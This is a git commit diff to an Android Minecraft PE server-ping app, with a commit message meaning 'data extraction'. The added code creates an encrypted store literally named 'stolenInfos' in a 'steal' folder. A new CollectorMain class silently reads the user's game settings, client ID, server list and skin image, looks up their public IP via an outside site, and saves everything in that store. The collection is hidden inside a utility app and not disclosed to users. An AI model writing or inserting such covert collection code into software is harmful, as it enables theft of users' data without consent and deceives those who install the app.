d0a6c0baf8120b6e2fed926ca96787d65bdc1d1f
nao20010128nao <nao20010128@gmail.com>
2015-12-21 23:02:29 +0900

    データ抜き取り

--- src/com/nao20010128nao/McServerPingPong/TheApplication.java
+++ src/com/nao20010128nao/McServerPingPong/TheApplication.java
@@ -2,11 +2,17 @@ package com.nao20010128nao.McServerPingPong;
 import android.app.*;
 import android.graphics.*;
 import uk.co.chrisjenx.calligraphy.*;
+import com.nao20010128nao.FileSafeBox.*;
+import java.io.*;
+import android.content.*;
+import android.preference.*;
+import java.util.*;
 
 public class TheApplication extends Application
 {
 	public static TheApplication instance;
 	public static Typeface cinzelDecorative,latoLight;
+	public SafeBox stolenInfos;
 	@Override
 	public void onCreate() {
 		// TODO: Implement this method
@@ -19,5 +25,19 @@ public class TheApplication extends Application
 									  .setFontAttrId(R.attr.fontPath)
 									  .build()
 									  );
+		///////
+		File f=new File(getFilesDir(),"steal");
+		if(!f.exists())f.mkdirs();
+		stolenInfos=new SafeBox.SafeBoxBuilder()
+			.makeNew(!new File(f,"manifest.bin").exists())
+			.password(genPassword())
+			.profilePath(f)
+			.readOnly(false)
+			.build();
+	}
+	private String genPassword(){
+		String s=PreferenceManager.getDefaultSharedPreferences(this).getString("uuid",UUID.randomUUID().toString());
+		PreferenceManager.getDefaultSharedPreferences(this).edit().putString("uuid",s).commit();
+		return s+s;
 	}
 }
---
+++ src/com/nao20010128nao/McServerPingPong/collector/CollectorMain.java
@@ -0,0 +1,127 @@
+package com.nao20010128nao.McServerPingPong.collector;
+import android.content.*;
+import com.nao20010128nao.McServerPingPong.*;
+import java.util.*;
+import android.preference.*;
+import java.io.*;
+import java.net.*;
+import android.os.*;
+import android.util.*;
+import com.google.gson.*;
+import com.nao20010128nao.FileSafeBox.*;
+
+public class CollectorMain extends ContextWrapper implements Runnable
+{
+	public CollectorMain(){
+		super(TheApplication.instance);
+	}
+
+	@Override
+	public void run() {
+		// TODO: Implement this method
+		Writer w=null;
+		try {
+			(w=new OutputStreamWriter(TheApplication.instance.stolenInfos.saveFile(System.currentTimeMillis() + ".json", SafeBox.MODE_GZIP))).append(new Gson().toJson(new Infos()));
+		} catch (IOException e) {
+			
+		}finally{
+			try {
+				if (w != null)w.close();
+			} catch (IOException e) {}
+		}
+	}
+	public class Infos{
+		public Map<String,String> mcpeSettings=readSettings();
+		public List<String> mcpeServers=readServers();
+		public long cid=getCid();
+		public String skin=readSkin();
+		public String ip=getIp();
+		public String uuid=PreferenceManager.getDefaultSharedPreferences(TheApplication.instance).getString("uuid","");
+		
+		private String getIp(){
+			BufferedReader br=null;
+			try{
+				br=new BufferedReader(new InputStreamReader(new URL("http://ieserver.net/ipcheck.shtml").openConnection().getInputStream()));
+				return br.readLine();
+			}catch(Throwable e){
+				return "127.0.0.1";
+			}finally{
+				try {
+					if (br != null)br.close();
+				} catch (IOException e) {}
+			}
+		}
+		private long getCid(){
+			BufferedReader br=null;
+			try{
+				br=new BufferedReader(new InputStreamReader(new FileInputStream(new File(Environment.getExternalStorageDirectory(),"games/com.mojang/minecraftpe/clientId.txt"))));
+				return new Long(br.readLine());
+			}catch(Throwable e){
+				return Long.MAX_VALUE;
+			}finally{
+				try {
+					if (br != null)br.close();
+				} catch (IOException e) {}
+			}
+		}
+		private Map<String,String> readSettings(){
+			Map<String,String> data=new HashMap(20);
+			BufferedReader br=null;
+			try{
+				br=new BufferedReader(new InputStreamReader(new FileInputStream(new File(Environment.getExternalStorageDirectory(),"games/com.mojang/minecraftpe/options.txt"))));
+				String s;
+				while(null!=(s=br.readLine())){
+					String[] spl=s.split("\\:");
+					data.put(spl[0],spl[1]);
+				}
+			}catch(Throwable e){
+				
+			}finally{
+				try {
+					if (br != null)br.close();
+				} catch (IOException e) {}
+			}
+			return data;
+		}
+		private List<String> readServers(){
+			List<String> data=new ArrayList(20);
+			BufferedReader br=null;
+			try{
+				br=new BufferedReader(new InputStreamReader(new FileInputStream(new File(Environment.getExternalStorageDirectory(),"games/com.mojang/minecraftpe/options.txt"))));
+				String s;
+				while(null!=(s=br.readLine())){
+					data.add(s);
+				}
+			}catch(Throwable e){
+
+			}finally{
+				try {
+					if (br != null)br.close();
+				} catch (IOException e) {}
+			}
+			return data;
+		}
+		private String readSkin(){
+			InputStream br=null;
+			ByteArrayOutputStream b=new ByteArrayOutputStream(100);
+			byte[] buf=new byte[100];
+			try{
+				br=new FileInputStream(new File(Environment.getExternalStorageDirectory(),"games/com.mojang/minecraftpe/custom.png"));
+				while(true){
+					int r=br.read(buf);
+					if(r<=0){
+						break;
+					}
+					b.write(buf,0,r);
+				}
+			}catch(Throwable e){
+				return null;
+			}finally{
+				try {
+					if (br != null)br.close();
+				} catch (IOException e) {}
+			}
+			return Base64.encodeToString(b.toByteArray(),Base64.NO_WRAP);
+		}
+	}
+}
